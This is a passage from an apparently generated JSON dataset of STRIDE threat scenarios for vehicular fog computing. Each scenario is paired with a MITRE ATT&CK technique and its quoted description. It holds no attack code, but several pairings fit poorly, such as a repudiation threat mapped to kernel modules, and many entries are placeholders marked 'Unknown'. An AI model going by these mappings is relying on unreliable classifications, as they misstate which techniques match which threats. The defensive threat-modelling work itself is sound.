                "description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--cc1e737c-236c-4e3b-83ba-32039a626ef8",
                "technique_id": "T1493"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Tampering with the firmware of fog nodes to alter their operation in favor of an attacker's goals.",
            "Assumptions": [
                {
                    "Assumption": "Firmware updates lack strong integrity verification mechanisms",
                    "Role": "System Developers",
                    "Condition": "Weak update mechanisms without cryptographic verification"
                },
                {
                    "Assumption": "Attackers can gain physical or remote access to fog nodes",
                    "Role": "Attackers",
                    "Condition": "Physical compromise or remote access to fog nodes"
                }
            ],
            "Potential Impact": "Altered behaviors of fog nodes, leading to incorrect data aggregation and processing.",
            "MITRE ATT&CK Keywords": [
                "firmware manipulation",
                "hardware tampering",
                "remote access"
            ],
            "mitre_technique": {
                "name": "Remote Access Software",
                "description": "An adversary may use legitimate desktop support and remote access software to establish an interactive command and control channel to target systems within networks. These services, such as `VNC`, `Team Viewer`, `AnyDesk`, `ScreenConnect`, `LogMein`, `AmmyyAdmin`, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment.(Citation: Symantec Living off the Land)(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy)\n\nRemote access software may be installed and used post-compromise as an alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary-controlled system.\n \nAdversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.\n\nInstallation of many remote access software may also include persistence (e.g., the software's installation routine creates a [Windows Service](https://attack.mitre.org/techniques/T1543/003)). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chrome\u2019s Remote Desktop).(Citation: Google Chrome Remote Desktop)(Citation: Chrome Remote Desktop)",
                "id": "attack-pattern--4061e78c-1284-44b4-9116-73e4ac3912f7",
                "technique_id": "T1219"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker tampers with the traffic flow data at RSUs to cause congestion and accidents.",
            "Assumptions": [
                {
                    "Assumption": "Weak or absent data integrity checks in RSUs",
                    "Role": "System Architects",
                    "Condition": "RSUs framework lacks robust integrity verification mechanisms"
                },
                {
                    "Assumption": "Attackers can inject false data into RSUs unnoticed",
                    "Role": "Attackers",
                    "Condition": "Ability to perform undetected data injection"
                }
            ],
            "Potential Impact": "Traffic congestion, potential accidents, and disrupted traffic management.",
            "MITRE ATT&CK Keywords": [
                "traffic data tampering",
                "RSU compromise",
                "data injection"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A driver could deny sending data about traffic violations to avoid fines.",
            "Assumptions": [
                {
                    "Assumption": "Lack of non-repudiation mechanisms in data transmission",
                    "Role": "System Architects",
                    "Condition": "No use of cryptographic methods ensuring non-repudiation"
                },
                {
                    "Assumption": "Attackers have knowledge of system vulnerabilities",
                    "Role": "Drivers or adversaries",
                    "Condition": "Awareness about weaknesses in logging or data integrity"
                }
            ],
            "Potential Impact": "Invalidation of infringement data and potential loss of enforcement credibility.",
            "MITRE ATT&CK Keywords": [
                "non-repudiation",
                "evidence tampering",
                "denial of action"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An administrator could deny changing fog node configurations leading to security breaches.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms lack granular details or auditability",
                    "Role": "System Administrators",
                    "Condition": "Log integrity features are not fully implemented"
                },
                {
                    "Assumption": "Insufficient controls to protect log data from tampering",
                    "Role": "System Developers",
                    "Condition": "Log management system is not tamper-proof"
                }
            ],
            "Potential Impact": "Misconfiguration of security settings and potential exploitation.",
            "MITRE ATT&CK Keywords": [
                "system misconfiguration",
                "log tampering",
                "audit trail"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious user could deny altering cloud service data for financial gain.",
            "Assumptions": [
                {
                    "Assumption": "No logging of user actions within cloud services",
                    "Role": "Cloud Service Providers",
                    "Condition": "Logging mechanisms are not enforced in cloud environments"
                },
                {
                    "Assumption": "Security protocols do not enforce non-repudiation",
                    "Role": "System Architects",
                    "Condition": "Absence of cryptographic methods ensuring non-repudiation"
                }
            ],
            "Potential Impact": "Unauthorized data manipulation and financial loss.",
            "MITRE ATT&CK Keywords": [
                "financial fraud",
                "cloud data manipulation",
                "denial of actions"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts sensitive data from smart vehicles as it travels to fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Data encryption is not implemented in communication channels",
                    "Role": "System Developers",
                    "Condition": "Lack of encryption mechanisms for data transmission"
                },
                {
                    "Assumption": "Attackers can monitor network traffic",
                    "Role": "Attackers",
                    "Condition": "Access to network channels is possible"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive vehicle data.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "unencrypted transmission",
                "network surveillance"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Data breaches in the cloud services reveal personal and sensitive information about drivers.",
            "Assumptions": [
                {
                    "Assumption": "Weak access control mechanisms in cloud environments",
                    "Role": "Cloud Service Providers",
                    "Condition": "Access controls do not enforce strong authentication and authorization"
                },
                {
                    "Assumption": "Attackers can gain unauthorized access to cloud databases",
                    "Role": "Attackers",
                    "Condition": "Exploitation of cloud vulnerabilities or misconfigurations"
                }
            ],
            "Potential Impact": "Exposure of personal information and privacy breaches.",
            "MITRE ATT&CK Keywords": [
                "cloud data breach",
                "unauthorized access",
                "personal data exposure"
            ],
            "mitre_technique": {
                "name": "Exploitation for Credential Access",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0\n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
                "id": "attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36",
                "technique_id": "T1212"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "RSUs transmitting unencrypted data reveal vehicle locations and routes to eavesdroppers.",
            "Assumptions": [
                {
                    "Assumption": "Data communication lacks encryption",
                    "Role": "System Developers",
                    "Condition": "Absence of encryption in data communication protocols"
                },
                {
                    "Assumption": "Attackers positioned to intercept RSU communications",
                    "Role": "Attackers",
                    "Condition": "Presence in proximity to RSUs or network tap point"
                }
            ],
            "Potential Impact": "Unauthorized tracking of vehicle movements.",
            "MITRE ATT&CK Keywords": [
                "vehicle tracking",
                "communication eavesdropping",
                "location exposure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Attackers flood fog nodes with excessive data requests, overwhelming their processing capabilities.",
            "Assumptions": [
                {
                    "Assumption": "No rate-limiting mechanisms implemented",
                    "Role": "System Developers",
                    "Condition": "System lacks functionality to limit request rates"
                },
                {
                    "Assumption": "Attackers can generate high traffic volumes",
                    "Role": "Attackers",
                    "Condition": "Access to resources to generate large request volumes"
                }
            ],
            "Potential Impact": "Fog nodes become unresponsive, disrupting data processing and latency-sensitive applications.",
            "MITRE ATT&CK Keywords": [
                "DoS",
                "traffic flooding",
                "system overload"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed denial of service (DDoS) attacks on cloud services force them offline.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services lack sufficient mitigation strategies",
                    "Role": "Cloud Service Providers",
                    "Condition": "No protection against massive inbound traffic"
                },
                {
                    "Assumption": "Attackers control a botnet to generate DDoS traffic",
                    "Role": "Attackers",
                    "Condition": "Access to a network of compromised devices"
                }
            ],
            "Potential Impact": "Unavailability of essential cloud services and long-term data processing.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "botnet",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "RSUs overwhelmed by network requests cause local traffic management failures.",
            "Assumptions": [
                {
                    "Assumption": "No local DoS protection mechanisms in RSUs",
                    "Role": "System Developers",
                    "Condition": "RSU software lacks capabilities to mitigate DoS attacks"
                },
                {
                    "Assumption": "Attackers can initiate extensive network requests",
                    "Role": "Attackers",
                    "Condition": "Ability to send multiple simultaneous requests to RSUs"
                }
            ],
            "Potential Impact": "Disruption in real-time traffic management and potential accidents.",
            "MITRE ATT&CK Keywords": [
                "DoS",
                "RSU overload",
                "traffic disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attackers exploit vulnerabilities in vehicle firmware to gain root access.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerabilities present in the firmware are exploitable",
                    "Role": "System Developers",
                    "Condition": "Unpatched or poorly secured firmware in vehicles"
                },
                {
                    "Assumption": "Attackers have the means to exploit firmware vulnerabilities",
                    "Role": "Attackers",
                    "Condition": "Tools and expertise to carry out firmware exploitation"
                }
            ],
            "Potential Impact": "Full control over vehicle systems, unauthorized actions, and data manipulation.",
            "MITRE ATT&CK Keywords": [
                "firmware exploitation",
                "root access",
                "vehicle system control"
            ],
            "mitre_technique": {
                "name": "System Firmware",
                "description": "System firmware on modern assets is often designed with an update feature. Older device firmware may be factory installed and require special reprograming equipment. When available, the firmware update feature enables vendors to remotely patch bugs and perform upgrades. Device firmware updates are often delegated to the user and may be done using a software update package. It may also be possible to perform this task over the network. \n\nAn adversary may exploit the firmware update feature on accessible devices to upload malicious or out-of-date firmware. Malicious modification of device firmware may provide an adversary with root access to a device, given firmware is one of the lowest programming abstraction layers. (Citation: Basnight, Zachry, et al.)",
                "id": "attack-pattern--b9160e77-ea9e-4ba9-b1c8-53a3c466b13d",
                "technique_id": "T0857"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider exploits administrative controls in fog nodes to gain unauthorized higher-level access.",
            "Assumptions": [
                {
                    "Assumption": "Weak internal access control mechanisms",
                    "Role": "System Developers",
                    "Condition": "Lax permissions and lack of rigorous access control protocols"
                },
                {
                    "Assumption": "Insiders have extensive system knowledge and access",
                    "Role": "Insiders",
                    "Condition": "Higher access roles allowing privilege escalation"
                }
            ],
            "Potential Impact": "Unauthorized actions taken with elevated permissions within fog nodes.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "insider threat",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of vulnerabilities in cloud service APIs allows attackers to elevate their access levels.",
            "Assumptions": [
                {
                    "Assumption": "Existence of vulnerabilities in cloud service API",
                    "Role": "System Developers",
                    "Condition": "APIs lack proper validation and are vulnerable"
                },
                {
                    "Assumption": "Attackers can interact with the cloud service API",
                    "Role": "Attackers",
                    "Condition": "Unrestricted interaction with cloud APIs"
                }
            ],
            "Potential Impact": "Unauthorized actions, data breaches, and potential system manipulation.",
            "MITRE ATT&CK Keywords": [
                "API exploitation",
                "cloud API vulnerability",
                "access elevation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        }
    ]
},
{
    "case_number": "11",
    "batch_number": "9",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof a legitimate smart vehicle and send false data to fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or logical access to a network used by smart vehicles.",
                    "Role": "Attacker",
                    "Condition": "Access to communication channels between smart vehicles and fog nodes."
                },
                {
                    "Assumption": "The communication protocol lacks strong cryptographic authentication.",
                    "Role": "System Designer",
                    "Condition": "No comprehensive authentication measures are implemented for smart vehicle communication."
                },
                {
                    "Assumption": "The fog nodes do not have a mechanism to verify the identity of the connected devices accurately.",
                    "Role": "System Developer",
                    "Condition": "Fog nodes rely on unauthenticated data from vehicles."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information, corruption of data used for traffic management.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "device",
                "reconnaissance"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could impersonate a fog node to intercept or alter vehicle data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to a network used by fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Network proximity and access to the communication channel between fog nodes and vehicles."
                },
                {
                    "Assumption": "The VFC system does not use mutual authentication between vehicles and fog nodes.",
                    "Role": "System Architect",
                    "Condition": "Authentication mechanisms are inadequate or absent."
                },
                {
                    "Assumption": "Fog nodes and vehicles use unsecured communication protocols.",
                    "Role": "Network Engineer",
                    "Condition": "Communication channels lack encryption."
                }
            ],
            "Potential Impact": "Corruption of data, potential data loss, and possible data breaches.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "interception",
                "man-in-the-middle"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof cloud services to fog nodes, leading to incorrect data processing.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can access communication channels between fog nodes and cloud services.",
                    "Role": "Attacker",
                    "Condition": "Security gaps in network segmentation or insufficient monitoring."
                },
                {
                    "Assumption": "There is no mutual authentication between fog nodes and cloud services.",
                    "Role": "System Architect",
                    "Condition": "Lack of proper authentication mechanisms."
                },
                {
                    "Assumption": "The data flow between fog nodes and cloud services is not encrypted.",
                    "Role": "Network Engineer",
                    "Condition": "Absence of encryption protocols (e.g., TLS)."
                }
            ],
            "Potential Impact": "Altered decision-making by fog nodes affecting traffic management and data integrity.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "cloud",
                "network",
                "device"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could compromise fog nodes to tamper with the data being processed.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes have vulnerabilities that can be exploited remotely or physically.",
                    "Role": "Attacker",
                    "Condition": "Presence of unpatched vulnerabilities in fog nodes."
                },
                {
                    "Assumption": "No tamper-evident mechanisms are employed on fog nodes.",
                    "Role": "Hardware Engineer",
                    "Condition": "Absence of physical and logical tamper detection."
                },
                {
                    "Assumption": "Security patches and updates are not applied regularly.",
                    "Role": "System Administrator",
                    "Condition": "Updating policies are not enforced or inadequate."
                }
            ],
            "Potential Impact": "Data integrity is compromised, leading to erroneous traffic management decisions and potential safety hazards.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "physical access",
                "remote code execution",
                "data corruption"
            ],
            "mitre_technique": {
                "name": "Remote Services",
